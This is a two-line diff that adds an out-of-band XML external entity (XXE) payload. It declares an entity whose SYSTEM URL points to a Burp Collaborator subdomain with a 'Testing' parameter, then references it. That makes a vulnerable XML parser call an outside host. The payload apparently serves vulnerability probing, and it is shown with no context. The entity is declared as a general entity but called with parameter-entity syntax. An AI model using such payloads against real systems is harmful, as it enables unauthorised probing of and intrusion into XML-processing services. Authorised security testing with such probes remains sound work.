@@ -1,0 +1,2 @@
+<!ENTITY test SYSTEM "http://7owzgx0md3f0qhtwl160f4h3juplda.burpcollaborator.net/?param=Testing">
+%test;
